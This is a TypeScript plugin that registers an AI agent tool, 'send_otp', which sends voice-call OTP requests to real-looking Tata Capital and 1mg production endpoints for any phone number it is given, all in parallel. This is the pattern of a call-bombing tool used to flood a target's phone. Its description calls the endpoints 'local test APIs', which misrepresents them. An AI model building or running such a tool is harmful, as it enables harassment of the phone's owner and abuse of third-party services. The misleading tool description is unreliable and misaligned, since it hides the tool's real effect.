const APIS = [
  {
    name: "Tata",
    url: "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
    method: "POST",
    category: "call",
    headers: {
      "Content-Type": "application/json",
    },
    body: {
      phone: "{phone}",
      isOtpViaCallAtLogin: "true",
    },
    success_codes: [200, 201, 202],
  },
  {
    name: "1",
    url: "https://www.1mg.com/auth_api/v6/create_token",
    method: "POST",
    category: "call",
    headers: {
      "Content-Type": "application/json; charset=utf-8",
    },
    body: {
      number: "{phone}",
      otp_on_call: true,
    },
    success_codes: [200, 201, 202],
  },
] as const;

function normalizePhone(phone: string): string {
  return phone.trim().replace(/[^\d+]/g, "");
}

function buildBody(
  body: Record<string, unknown>,
  phone: string,
): Record<string, unknown> {
  return JSON.parse(JSON.stringify(body).replaceAll("{phone}", phone));
}

async function callApi(api: (typeof APIS)[number], phone: string) {
  try {
    const response = await fetch(api.url, {
      method: api.method,
      headers: api.headers,
      body: JSON.stringify(buildBody(api.body, phone)),
    });

    const text = await response.text();

    return {
      name: api.name,
      status: response.status,
      success: (api.success_codes as readonly number[]).includes(response.status),
      response: text.slice(0, 1000),
    };
  } catch (error) {
    return {
      name: api.name,
      status: 0,
      success: false,
      response: error instanceof Error ? error.message : String(error),
    };
  }
}

export default function register(pi) {
  pi.registerTool({
    name: "send_otp",
    label: "Send OTP",
    description: "Send an OTP request to the configured local test APIs.",
    parameters: {
      type: "object",
      properties: {
        phone: {
          type: "string",
          description: "Phone number to send the OTP request to.",
        },
      },
      required: ["phone"],
      additionalProperties: false,
    },

    async execute(_toolCallId, params) {
      const phone = normalizePhone(params.phone);

      if (!phone) {
        return {
          content: [{ type: "text", text: "Invalid phone number." }],
          isError: true,
        };
      }

      const results = await Promise.all(
        APIS.map((api) => callApi(api, phone)),
      );

      const output = results
        .map(
          (result) =>
            `${result.name}: ${result.success ? "SUCCESS" : "FAILED"} ` +
            `(HTTP ${result.status})\n${result.response}`,
        )
        .join("\n\n");

      return {
        content: [
          {
            type: "text",
            text: `OTP requests completed for ${phone}.\n\n${output}`,
          },
        ],
        details: { phone, results },
      };
    },
  });
}
